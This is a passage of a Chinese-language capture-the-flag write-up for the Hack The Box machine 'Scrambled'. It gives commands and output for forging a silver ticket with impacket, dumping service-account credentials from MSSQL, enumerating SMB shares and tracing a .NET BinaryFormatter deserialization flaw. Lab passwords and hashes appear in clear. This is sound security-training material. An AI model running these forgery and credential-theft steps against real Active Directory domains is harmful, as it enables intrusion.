class="line">cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MBwGA1UdEQEB/wQSMBCCDkRDMS5zY3Jt</span><br><span class="line">LmxvY2FsME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y</span><br><span class="line">MS0yNzQzMjA3MDQ1LTE4Mjc4MzExMDUtMjU0MjUyMzIwMC0xMDAwMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4IBAQCecGFCSZW5yaXkTpXR5b09rpGBFyLSOJeS0Hv1LBmeN040mUXr</span><br><span class="line">9wydqlVd1jPt2HbiMA07ftoR3LnCZYEOppSK+yX4GePev04aFRbFAunUDPvzC1FI</span><br><span class="line">0Tqrh9/DSW0Zuqsmp6k34B5MSiYYfgSqtF4qdYQ4FyuxqoBft89+C+T65e5Io6Yu</span><br><span class="line">BAdyMGJqohUMGPxk3hzRQV5MqikqS/Ffj27YnqbBXivAr0W1RkytDHdsdqus9iNr</span><br><span class="line">EdMfkFzdSxBppaS59c+x289sotNYT0gTywBX86QDyP+TEFZgPqX5pQVuazo1HOyC</span><br><span class="line">41E5cc4R5EyAhM/olViiJa5w/LrKFa7oEgec</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure>
+
+<p>将其中<code>CERTIFICATE</code>的部分保存，编辑<code>/etc/ldap/ldaps.conf</code>作为后续的pem使用</p>
+<p>修改ldap.conf，新增一行指向刚刚获取到的证书的保存路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo <span class="built_in">cat</span> /etc/ldap/ldap.conf</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAP Defaults</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See ldap.conf(5) for details</span></span><br><span class="line"><span class="comment"># This file should be world readable but not world writable.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#BASE   dc=example,dc=com</span></span><br><span class="line"><span class="comment">#URI    ldap://ldap.example.com ldap://ldap-provider.example.com:666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#SIZELIMIT      12</span></span><br><span class="line"><span class="comment">#TIMELIMIT      15</span></span><br><span class="line"><span class="comment">#DEREF          never</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TLS certificates (needed for GnuTLS)</span></span><br><span class="line"><span class="comment">#TLS_CACERT     /etc/ssl/certs/ca-certificates.crt</span></span><br><span class="line">TLS_CACERT /home/Desktop/htb/Scrambled/sqlsvc.pem</span><br></pre></td></tr></table></figure>
+
+<p>现在就可以通过<code>ldapsearch</code>来连接ldaps</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -Z -H ldaps://dc1.scrm.local:636 -s base -D <span class="string">&#x27;sqlsvc@scrm.local&#x27;</span> -w <span class="string">&#x27;Pegasus60&#x27;</span></span><br><span class="line">ldap_start_tls: Operations error (1)</span><br><span class="line">        additional info: 00000000: LdapErr: DSID-0C091325, comment: TLS or SSL already <span class="keyword">in</span> effect, data 0, v4563</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=scrm,DC=<span class="built_in">local</span></span><br><span class="line">ldapServiceName: scrm.local:dc1<span class="variable">$@SCRM</span>.LOCAL</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>不过这里我还是用的<code>powerview.py</code>看的sid（</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ powerview scrm.local/sqlsvc:Pegasus60@dc1.scrm.local --dc-ip 10.10.11.168 -k</span><br><span class="line"></span><br><span class="line">(LDAPS)-[DC1.scrm.local]-[SCRM\sqlsvc]</span><br><span class="line">PV &gt; Get-DomainObject -Identity  administrator</span><br><span class="line">objectClass                : top</span><br><span class="line">                             person</span><br><span class="line">                             organizationalPerson</span><br><span class="line">                             user</span><br><span class="line">cn                         : Administrator</span><br><span class="line">...</span><br><span class="line">objectSid                  : S-1-5-21-2743207045-1827831105-2542523200-500</span><br><span class="line">adminCount                 : 1</span><br><span class="line">accountExpires             : 9223372036854775807</span><br><span class="line">logonCount                 : 257</span><br><span class="line">sAMAccountName             : administrator</span><br><span class="line">sAMAccountType             : SAM_USER_OBJECT</span><br><span class="line">userPrincipalName          : administrator@scrm.local</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>用户sid就是500，域sid这域里也没有子域啥的所以就是用户sid的前面<code>S-1-5-21-2743207045-1827831105-2542523200</code>这个</p>
+<p>而后是服务账号<code>sqlsvc</code>的nthtml，既然有了明文密码直接拿来生成一个就好</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-6.png" alt="alt text"></p>
+<p>当然也可以用openssl来生成</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html">https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> gen_pass2nthash</span><br><span class="line"><span class="comment">#!/usr/bin/bash</span></span><br><span class="line">iconv -f ASCII -t UTF-16LE &lt;(<span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>) | openssl dgst -md4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ gen_pass2nthash Pegasus60</span><br><span class="line">MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05</span><br></pre></td></tr></table></figure>
+
+<p>集齐了三个必要项之后就可以制作银票，spn选择<code>sqlsvc</code>的，因为他是mssql的服务账号啦。</p>
+<p>目前就可以拿着身份为<code>administrator</code>的银票去访问<code>mssql</code>了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-ticketer -spn <span class="string">&#x27;MSSQLSvc/dc1.scrm.local&#x27;</span>  -dc-ip 10.10.16.168  -domain scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -user-id 500 -domain-sid  S-1-5-21-2743207045-1827831105-2542523200  administrator</span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>其实也可以不用目标sid，像下面这个样子，看个人喜好，我习惯写全点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-ticketer -spn <span class="string">&#x27;MSSQLSvc/dc1.scrm.local&#x27;</span>  -dc-ip 10.10.16.168  -domain scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05  -domain-sid  S-1-5-21-2743207045-1827831105-2542523200  administrator</span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> scrm.local/administrator</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>看下票据信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 ~/tools/impacket/examples/describeTicket.py ./administrator.ccache</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Number of credentials in cache: 1</span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : 6f59694f45596975426e44596a697547</span><br><span class="line">[*] User Name                     : administrator</span><br><span class="line">[*] User Realm                    : SCRM.LOCAL</span><br><span class="line">[*] Service Name                  : MSSQLSvc/dc1.scrm.local</span><br><span class="line">[*] Service Realm                 : SCRM.LOCAL</span><br><span class="line">[*] Start Time                    : 02/01/2025 06:19:33 AM</span><br><span class="line">[*] End Time                      : 31/12/2034 06:19:33 AM</span><br><span class="line">[*] RenewTill                     : 31/12/2034 06:19:33 AM</span><br><span class="line">[*] Flags                         : (0x50a00000) forwardable, proxiable, renewable, pre_authent</span><br><span class="line">[*] KeyType                       : rc4_hmac</span><br><span class="line">[*] Base64(key)                   : b1lpT0VZaXVCbkRZaml1Rw==</span><br><span class="line">[*] Kerberoast hash               : $krb5tgs$23$*USER$SCRM.LOCAL$MSSQLSvc/dc1.scrm.local*$9a97d5e5495646611aadfaa5913da2fa$4e7996d57fefd716eeceb39054f50a0a12cb05e8c51c84cd41dbed6eb40f597a0bb672b1008a6c7c7c61ab6272615df45635b29844e2549df9e42890324147aeb7402b3e5a436f9acbe7a51ff017c7b9162eb79a69d35793c6e10748d22991103aabfd1330881a1887298923023095787e7bd7ffa5e4c943c2957b0383403d2082ee879b44750ee0d7497a5b92833a3213214f4a147e23f1582c336e01bec852055bf1d2839e99097534fef0aea343aa72706f5fa79be646743a655fb8d65d1ca7d34e4a1d2734b2f60d66f1f173747c79888db2b7e4122b0d61923736f37b5c57ede0ca18f7f7b599b40b28693e1600f0f7c7744b9e40590c039741a92039aec452e5cd6588f6188a5f4e9c3ae9148ec3bf98ce6b7be5691a4e6cafacd9e609a3d5d3724f694c96b16cadfa60377a9cdd9a9dd5c1b2fc3a1a9dc2af3db0da10adb4822ca70b2821721eb112e71e6922b090954e54ed08df19db91e310857dbfb522d4642cb5a0dbe0d15a70078946ecc6bea8878d913f28f68d227ecc74ddc42b910e24740c6bc358ffcabf8a933d9b28fe47c3ecc1f0d5a4b1fc474c0b81c12fc1e466b6c8f50d47663bd8a6faf1dda873716247cde63e728a313e67f4d36896aeb8a549053629ae90b10f8aee802839780c24f37e40d84f3e66222225253d4ce7bc0ecf800dda4d8493d0f666b35dcdb663a9aaded80cfb005c14b4ab2d67dc20e34b74ad9255fc3515c4f39a3d59978ef1a14fc8b3eae049cc211496a20b931a7d279327341d78904c0345df41dcb3d8812b28f39ab1a76150b89dc1de802b28c2bd81ae3761852015a2db0a60ada877103c28cbfe4521ef2eeabfaca8f95f61274664f9a659ad1af86e422d26535145fb445845a521b068dc5c914c7484249f6b49554c6d8d3ea2df1a10dfc2f4d09f8d6c8ec8b6f9fa56fd129025546fd2f61bb47f6148c64917f1bdf95408b247a6facaa49e77975b7129abfcc16fcedeef521a5c7bc3e5755455a08181c04348be26cfcc775eae4457f8bf036264eac0d91fca268358b52197eb8f013b04f467e9cf05eae60805b36a13c258f7b2ba48a81152117335f2c18218903bd42a1108aa52fb6e079e71fc98a96110389ebea1ae9581bbf4e276b2ae0608969323ad5fc504cdd6685135f5afd8ba587e12d5875fb87347170bf52eddce3744b1539184b06712e30987a9b9a707281da1454512f247de06913000b4b67382025dede06e42df589479839111c7b4cf7f0b2ede5c74ced20bc33f9568ef0f70b8c36410085591c19a66611d</span><br><span class="line">[*] Decoding unencrypted data in credential[0][&#x27;ticket&#x27;]:</span><br><span class="line">[*]   Service Name                : MSSQLSvc/dc1.scrm.local &lt;-spn</span><br><span class="line">[*]   Service Realm               : SCRM.LOCAL</span><br><span class="line">[*]   Encryption type             : rc4_hmac (etype 23)</span><br><span class="line">[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied</span><br></pre></td></tr></table></figure>
+
+<p>spn是我们指定的mssqlsvc没错，可以快乐访问了</p>
+<p>导入票据后，连接数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-mssqlclient -dc-ip 10.10.11.168  dc1.scrm.local -k  -debug</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[+] Using Kerberos Cache: ./administrator.ccache</span><br><span class="line">[+] Domain retrieved from CCache: SCRM.LOCAL</span><br><span class="line">[+] SPN MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL not found <span class="keyword">in</span> cache</span><br><span class="line">[+] AnySPN is True, looking <span class="keyword">for</span> another suitable SPN</span><br><span class="line">[+] Returning cached credential <span class="keyword">for</span> MSSQLSVC/DC1.SCRM.LOCAL@SCRM.LOCAL</span><br><span class="line">[+] Using TGS from cache</span><br><span class="line">[+] Changing sname from MSSQLSvc/dc1.scrm.local@SCRM.LOCAL to MSSQLSVC/DC1.SCRM.LOCAL:1433@SCRM.LOCAL and hoping <span class="keyword">for</span> the best</span><br><span class="line">[+] Username retrieved from CCache: administrator</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC1): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC1): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br></pre></td></tr></table></figure>
+
+<p>看下都有哪些库，能看到有个hr的库，他pdf中也说了，是因为<code>凭证泄露风险</code>而ban的hr组的数据库访问权限，所以其中大概率是有凭证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; enum_db</span><br><span class="line">name         is_trustworthy_on   </span><br><span class="line">----------   -----------------   </span><br><span class="line">master                       0   </span><br><span class="line"></span><br><span class="line">tempdb                       0   </span><br><span class="line"></span><br><span class="line">model                        0   </span><br><span class="line"></span><br><span class="line">msdb                         1   </span><br><span class="line"></span><br><span class="line">ScrambleHR                   0   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查看表信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@master)&gt; use ScrambleHr;</span><br><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select name from sys.tables;</span><br><span class="line">name         </span><br><span class="line">----------   </span><br><span class="line">Employees    </span><br><span class="line"></span><br><span class="line">UserImport   </span><br><span class="line"></span><br><span class="line">Timesheets   </span><br></pre></td></tr></table></figure>
+
+<p>翻了下三个表就这个<code>UserImport</code>里不是空的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (SCRM\administrator  dbo@ScrambleHR)&gt; select * from UserImport;</span><br><span class="line">LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   </span><br><span class="line">--------   -----------------   ----------   ---------------   -------------   </span><br><span class="line">MiscSvc    ScrambledEggs9900   scrm.local                90               0 </span><br></pre></td></tr></table></figure>
+
+<p>得到账号密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MiscSvc</span><br><span class="line"></span><br><span class="line">ScrambledEggs9900</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-7.png" alt="alt text"></p>
+<p>这个用户在<code>ITshares</code>组和<code>remote managment</code>中，不过拿着他的票据去winrm连不上</p>
+<p>我改了下krb的配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat /etc/krb5.conf</span><br><span class="line">[libdefaults]</span><br><span class="line">    default_realm = SCRM.LOCAL</span><br><span class="line">    dns_lookup_realm = true</span><br><span class="line">    dns_lookup_kdc = true</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    SCRM.LOCAL = &#123;</span><br><span class="line">        kdc = dc1.scrm.local</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    .scrm.local = SCRM.LOCAL</span><br><span class="line">    scrm.local = SCRM.LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>发起连接，但是却不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -r scrm.local -i dc1.scsrm.local -u miscsvc</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Warning: User is not needed for Kerberos auth. Ticket will be used</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">                                        </span><br><span class="line">Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information</span><br><span class="line">Server not found in Kerberos database</span><br><span class="line"></span><br><span class="line">                                        </span><br><span class="line">Error: Exiting with code 1</span><br></pre></td></tr></table></figure>
+
+<p>再通过这个账号密码去查看他<code>ITUser</code>组smb的share</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k -dc-ip 10.10.11.168</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># shares</span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">HR</span><br><span class="line">IPC$</span><br><span class="line">IT</span><br><span class="line">NETLOGON</span><br><span class="line">Public</span><br><span class="line">Sales</span><br><span class="line">SYSVOL</span><br><span class="line"></span><br><span class="line"># use IT</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 15:32:55 2021 .</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 15:32:55 2021 ..</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 17:06:32 2021 Apps</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 15:32:44 2021 Logs</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 15:32:55 2021 Reports</span><br><span class="line"># cd Apps</span><br><span class="line"></span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 17:06:32 2021 .</span><br><span class="line">drw-rw-rw-          0  Wed Nov  3 17:06:32 2021 ..</span><br><span class="line">drw-rw-rw-          0  Fri Nov  5 16:57:08 2021 Sales Order Client</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
+
+<p>在这个文件夹中包含了一个<code>exe</code>和一个<code>dll</code></p>
+<p>这部分需要切到win的环境做，在win中打开exe，即可发现和我们在web部分看到的是同一个程式。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-8.png" alt="alt text"></p>
+<p>那按照web上的信息来配置即可，同样勾选<code>debug</code></p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-9.png" alt="alt text"></p>
+<p>server是<code>dc1.scrm.local</code>,port是<code>4411</code></p>
+<p>这里通过尝试了几个密码都无法登录，同时再进行反编译可以看到，在login部分输入<code>scrmdev</code>用户名时，可以直接return登录成功。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-10.png" alt="alt text"></p>
+<p>我们开启了debug，所以他会在本地输出所有日志保存到txt当中</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-11.png" alt="alt text"></p>
+<p>这里我们作为客户端，登录之后收到的base64的内容显然是序列化过后的。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-13.png" alt="alt text"></p>
+<p>那继续点击尝试他的功能，之后再刷新查看日志</p>
+<p>当我于这里更新order时，观测到它由客户端向服务器发送了序列化的请求</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-12.png" alt="alt text"></p>
+<p>根据他开头的<code>UPLOAD_ORDER</code>关键字尝试寻找，于<code>ScrambleNetRequest</code>中发现了这部分。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-14.png" alt="alt text"></p>
+<p>接下来找后面的序列化是在哪部分拼接到<code>UPLOAD_ORDER</code>后方，这里可以通过findusage找到<code>SendRequestAndGetResponse</code>之中进行的调用</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-15.png" alt="alt text"></p>
+<p>后面这里就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD_ORDER +&quot;;&quot; +Request.Parmeter+&quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p>关注一下<code>Request.Parmeter</code>怎么来的，其实是上面的<code>UploadOrder</code>方法调用的。</p>
+<p><img src="/wpimages/2024/tracks-ad/Scrambled/image-16.png" alt="alt text"></p>
+<p>这里又是<code>salseorder</code>，它定义了一个<code>SerializeToBase64</code>方法。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#salseorder</span></span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">SerializeToBase64</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">      BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">      Log.Write(<span class="string">&quot;Binary formatter init successful&quot;</span>);</span><br><span class="line">      <span class="keyword">using</span> (MemoryStream serializationStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">      &#123;</span><br><span class="line">        binaryFormatter.Serialize((Stream) serializationStream, (<span class="built_in">object</span>) <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> Convert.ToBase64String(serializationStream.ToArray());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>这里说白了他的流程就是把<code>upload_order</code>的信息序列化后，拼接成<code>UPLOAD_ORDER;序列化内容</code>，而后发送到服务端。</p>
+<p>也就是<code>scrm.local:4411</code>，那对server侧肯定也就会<code>Deserialize</code>也就是反序列化。</p>
+<p>这里需要用到<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net"><code>ysoserial.net</code></a></p>
